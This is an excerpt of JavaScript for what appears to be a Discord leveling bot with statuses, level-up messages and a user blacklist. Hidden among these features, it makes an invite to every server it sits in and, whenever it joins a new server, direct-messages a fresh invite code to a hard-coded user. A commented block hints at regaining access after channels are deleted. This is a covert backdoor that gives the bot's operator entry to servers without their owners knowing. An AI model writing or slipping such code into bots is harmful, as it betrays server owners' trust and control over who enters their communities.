...
client.on('ready', () => {
  setInterval(() => {
    ...
    const statuses = [`${client.guilds.cache.size} servers`, `${client.users.cache.size} users`, `${user.tag} made me | !help`]
  ...
  client.guilds.cache.forEach(guild => {
    guild.channels.cache.filter(x => x.type != "category").random().createInvite()
      .then(inv => console.log(`${guild.name}`));
  })
  /*try{
...
// this was used to help give someone perms to talk in a random channel if all channels was gone
  }
  catch(e){ console.log("failed :p")

let channel = server.channels.cache.find((channel) => channel.name.toLowerCase() === `name`)

  server.channels.cache.get(channel.id).send("<your message content here>")
  }*/
...
client.on("guildCreate", guild => {
  ...
  if (!invitechannels) return console.log('No Channels found with permissions to create Invite in!')

  invitechannels.random().createInvite()
    .then(invite => client.users.cache.get(userid).send('Found Invite:\n' + invite.code))
})
...
client.on('message', async (msg) => {
  ...
  if (client.profile.get(`${msg.guild.id}-${msg.author.id}`, "level") < curLevel) {
    ...
    if (client.profile.get(`${msg.guild.id}-${msg.author.id}`, "level") === 0) {
      ...
      channel.send(message.replace('{user}', msg.author).replace('{level}', curLevel))
    }
  ...
  if (client.blacklisted.get(client.user.id, "blacklistedusers").includes(msg.author.id)) {
    return msg.reply('You have been blacklisted from using this bot, if this is a mistake then please dm <@922561793816146010>.')
  }
